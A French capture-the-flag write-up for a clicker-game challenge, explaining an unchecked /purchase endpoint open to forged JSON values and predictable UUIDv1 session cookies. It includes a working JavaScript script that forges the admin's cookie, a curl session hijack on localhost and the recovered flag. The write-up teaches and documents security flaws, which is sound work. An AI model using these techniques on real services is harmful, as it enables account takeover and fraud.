# Faille(s) de sécurité

Pour ce défi, nous avions initialement prévu de faire une simple requête API vulnérable aux entrées utilisateur - que nous avons "implémentée" - mais nous avons décidé d'en rajouter une seconde, plus élaborée, et déjà exploitée sur le web.


## Première faille: requêtes non vérifiées côté serveur

Malgré les maintes sécurités mises en place pour s'assurer que les requêtes utilisateurs respectent le format choisi à la lettre, le serveur ne connait pas les différentes améliorations disponibles au client, et donc ne les vérifie pas. Les valeurs envoyées par le client lors d'un appel au chemin `/purchase` pourraient être forgées par un utilisateur malveillant pour augmenter son score sans aucune limite.

Voici un exemple d'appel normal à l'API, envoyé par le client:
```json
{
    "id": 1,
    "cost": 25,
    "cps": 1,
    "multiplier": 2
}
```

Ici, on achète la première amélioration pour 25 pièces, qui ajoutera 2 au multiplicateur de clics et 1 clic par secondes.  
On pourrait sans aucun souci envoyer ce message:  
```json
{
    "id": 9999,
    "cost": -20000,
    "cps": 1e100,
    "multiplier": 424242424242
}
```
Cette requête va, en plus d'ajouter de l'argent sur le compte de l'utilisateur au lieu d'en soustraire, lui ajouter 10 puissance 100 clics par seconde, et un multiplicateur tout aussi élevé.  


On pourrait très facilement régler cette vulnérabilité en stockant les améliorations du côté du serveur et en les chargeant dynamiquement sur le client. Cependant, il s'agit d'une vulnérabilité très souvent présente dans des applications réelles, et dont la fréquence d'apparition risque fortement d'augmenter à cause de la hausse d'utilisation d'agent d'IA pour l'automatisation d'écriture de code. (voir posts sur les vibe-coders piratés en 24h)

## Deuxième faille: cookies de session d'utilisateur prédictibles

Pour stocker les données de chaque joueur, on utilise des cookies de session pour simplifier les échanges via HTTP.  
Pour choisir un cookie de session unique pour chaque utilisateur, on peut avoir recourt à des UUIDs. Ces identifiants sont garantis d'être uniques à chaque appel de la fonction. Cependant, les UUIDv1 sont basés uniquement sur la date actuelle (et quelques informations fixes définies à l'initialisation du programme), ce qui permet à quelqu'un qui connaitrait la date de création d'un compte de créer un UUID valide à la date donnée.  
Comme par coïncidence, le chemin d'api `/scoreboard` renvoie des informations sous ce format:
```json
[
    {
        "username": "admin",
        "currency": 1e+100,
        "created_at": "2025-12-05T01:33:29.057Z",
    },
    // ...
]
```
À partir de la date récupérée, et un token utilisateur quelconque (`6abd46d0-d17a-11f0-adac-8bc953f993a8` par exemple), on peut reconstruire le cookie de session de l'admin, comme suit:

```js
const givenUUID = '6abd46d0-d17a-11f0-adac-8bc953f993a8'; // UUID d'un autre utilisateur quelconque
const targetDate = new Date("2025-12-05T01:33:29.057Z");  // Date de création de l'UUID visée

function uuidv1FromDate(date, clockSeq, node) {
  const UUID_EPOCH_MS = Date.UTC(1582, 9, 15, 0, 0, 0, 0);

  const timestampMs = date.getTime() - UUID_EPOCH_MS;
  const timestamp = BigInt(timestampMs) * 10000n; // microsecondes = 0 en js

  const timeLow = Number(timestamp & 0xFFFFFFFFn).toString(16).padStart(8, '0');
  const timeMid = Number((timestamp >> 32n) & 0xFFFFn).toString(16).padStart(4, '0');
  const timeHi = Number((timestamp >> 48n) & 0x0FFFn).toString(16).padStart(3, '0');
  const timeHiVersion = '1' + timeHi; // Version 1

  return `${timeLow}-${timeMid}-${timeHiVersion}-${clockSeq}-${node}`;
}

const clockSeq = givenUUID.split('-')[3];
const node = givenUUID.split('-')[4];
const generatedUUID = uuidv1FromDate(targetDate, clockSeq, node);

console.log('Target date:', targetDate.toISOString());
console.log('Generated UUID:', generatedUUID); // Résultat: 66dead10-d17a-11f0-adac-8bc953f993a8
```

Avec ce code, on récupère le cookie de l'administrateur: `66dead10-d17a-11f0-adac-8bc953f993a8`.  
On peut alors se connecter à son compte en utilisant le cookie généré:
```bash
$ curl -i -b 'session=66dead10-d17a-11f0-adac-8bc953f993a8' localhost:3000/user
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 207
ETag: W/"cf-3vrHYhpjY4xZj9oOFzE07Qe6PFc"
Date: Fri, 05 Dec 2025 01:41:30 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"username":"admin","last_seen":"2025-12-05T01:33:29.058Z","creation_date":"2025-12-05T01:33:29.057Z","currency":1e+100,"cps":0,"multiplier":1,"purchases":[],"flag":"INSASH{t1m3_b4s3d_Uu1D_4r3_pR3d1Ct4bl3}"}
```

On récupère alors les information de l'administrateur, et un très beau flag qui nous est donné en guise de récompense: `INSASH{t1m3_b4s3d_Uu1D_4r3_pR3d1Ct4bl3}`!